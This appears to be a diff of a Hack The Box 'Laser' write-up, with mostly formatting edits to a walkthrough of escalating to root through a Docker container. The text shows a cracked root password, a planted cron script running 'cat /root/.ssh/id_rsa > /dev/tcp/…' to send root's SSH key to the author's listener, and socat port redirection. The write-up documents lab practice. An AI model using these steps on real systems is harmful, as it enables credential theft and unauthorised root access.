@@ -1368,11 +1354,9 @@ The password was `c413d115b3d87664499624e7826d8c5a`
 
 verified the length
 
-
-
 ### Getting a shell
 
-```
+```text
 solr@laser:/dev/shm$ ssh root@172.18.0.2
 root@172.18.0.2's password: 
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
@@ -1392,14 +1376,14 @@ root@20e3289bc183:~#
 
 logged in as root to the docker container. Now to try my standard container privesc where I mount the root filesytem into the container
 
-```
+```text
 solr@laser:~$ which docker
 /usr/bin/docker
 ```
 
 first I verified that the `docker` program was on the host system
 
-```
+```text
 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/dev/shm/docker
 root@172.18.0.2's password: 
 docker                                                                  0%    0     0.0KB/s   --:-- ETAscp: /dev/shm/docker: No space left on device
@@ -1408,7 +1392,7 @@ docker                                                                100%   81M
 
 next I tried to copied the program to `/dev/shm` folder on the container, but unfortunately there was no space to copy the file
 
-```
+```text
 root@20e3289bc183:~# df
 Filesystem     1K-blocks    Used Available Use% Mounted on
 overlay         20508240 8870440  10572996  46% /
@@ -1421,9 +1405,9 @@ tmpfs            1017608       0   1017608   0% /proc/scsi
 tmpfs            1017608       0   1017608   0% /sys/firmware
 ```
 
-verfieid open space, and noticed it was just running memory space that was full (`/dev/shm`) 
+verfieid open space, and noticed it was just running memory space that was full \(`/dev/shm`\)
 
-```
+```text
 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/tmp/docker
 root@172.18.0.2's password: 
 docker
@@ -1431,20 +1415,20 @@ docker
 
 so I copied the file to /tmp instead
 
-```
+```text
 'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
 ```
 
 I noticed another process being run by sshpass was executing a script `clear.sh` in the tmp directory
 
-https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https
+[https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)
 
-```
+```text
 solr@laser:/tmp$ vim /tmp/clear.sh
 solr@laser:/tmp$ chmod +x /tmp/clear.sh
 ```
 
-I made a script to copy roots ssh key to my machine so the cron job would run it 
+I made a script to copy roots ssh key to my machine so the cron job would run it
 
 ```bash
 #! /bin/bash
@@ -1454,21 +1438,21 @@ cat /root/.ssh/id_rsa > /dev/tcp/10.10.15.98/9099
 
 my bash script was very simple, and just copies `root`'s SSH to my machine using TCP sockets
 
-```
+```text
 root@20e3289bc183:/tmp# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
 2020/12/19 23:13:20 socat[1919] E bind(5, {AF=2 0.0.0.0:22}, 16): Address already in use
 ```
 
-Using `socat` I tried to redirect port 22 trafic from the container to the host so it would execute but the port was already in use (by ssh)
+Using `socat` I tried to redirect port 22 trafic from the container to the host so it would execute but the port was already in use \(by ssh\)
 
-```
+```text
 root@20e3289bc183:~# service ssh stop
  * Stopping OpenBSD Secure Shell server sshd                                                     [ OK ]
 ```
 
 next, I stopped the ssh service to clear the port
 
-```
+```text
 solr@laser:/dev/shm$ ssh root@172.18.0.2
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@ -1488,14 +1472,15 @@ Keyboard-interactive authentication is disabled to avoid man-in-the-middle attac
 root@172.18.0.2: Permission denied (publickey,password).
 ```
 
-for some reason I was unable to ssh in at one point while fixing up everything (it took me a number of tries to get it to work properly!) running the command it mentioned `ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"` cleared the error and allowed me to log in again
+for some reason I was unable to ssh in at one point while fixing up everything \(it took me a number of tries to get it to work properly!\) running the command it mentioned `ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"` cleared the error and allowed me to log in again
 
-```
+```text
 root@20e3289bc183:~# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
 ```
+
 After recreating the script I started the socat redirect again
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 9099
 listening on [any] 9099 ...
@@ -1545,7 +1530,7 @@ I received the SSH key back at my waiting listener almost immediately after star
 
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ ssh root@10.10.10.201 -i laser.key
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
@@ -1585,7 +1570,7 @@ laser
 
 After that I logged in with the ssh key and collected my hard-earned proof!
 
-```
+```text
 root@laser:~# cat clear.sh 
 #!/bin/sh
 
@@ -1618,3 +1603,4 @@ In the root directory I also found the scripts that explained how this machine w
 Thanks to [`MrR3boot`](https://app.hackthebox.eu/users/13531) & [`R4J`](https://app.hackthebox.eu/users/13243) for... something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
